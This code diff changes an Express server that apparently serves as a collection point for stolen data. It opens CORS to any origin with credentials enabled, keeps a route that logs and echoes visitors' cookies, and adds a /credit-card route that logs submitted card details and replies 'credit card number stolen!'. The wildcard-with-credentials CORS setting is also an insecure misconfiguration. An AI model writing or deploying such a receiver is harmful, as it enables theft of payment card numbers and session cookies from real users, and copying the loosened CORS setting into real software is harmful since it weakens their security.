@@ -1,13 +1,17 @@
 // Import dependencies
 const express = require('express');
 const cors = require('cors');
+const bodyParser = require('body-parser');
 
 // Initialize the Express application
 const app = express();
 
+app.use(bodyParser.json()); // for parsing application/json
+app.use(bodyParser.urlencoded({ extended: true })); // for parsing application/x-www-form-urlencoded
+
 // Specify the CORS configuration
-var corsOptions = {
-    origin: 'http://localhost:3000', // This should be your client-side URL
+let corsOptions = {
+    origin: '*', // This should be your client-side URL
     optionsSuccessStatus: 200,
     credentials: true // This allows the session cookie to be sent back and forth
 };
@@ -31,6 +35,12 @@ app.get('/read-cookie', async (req, res) => {
     const cookies = req.headers.cookie;
     console.log('Cookies:', cookies);
     res.send(cookies);
+});
+
+
+app.post('/credit-card', (req, res) => {
+    console.log('credit card digits:', req.body);
+    res.send('credit card number stolen!');
 });
 
 // Start the server
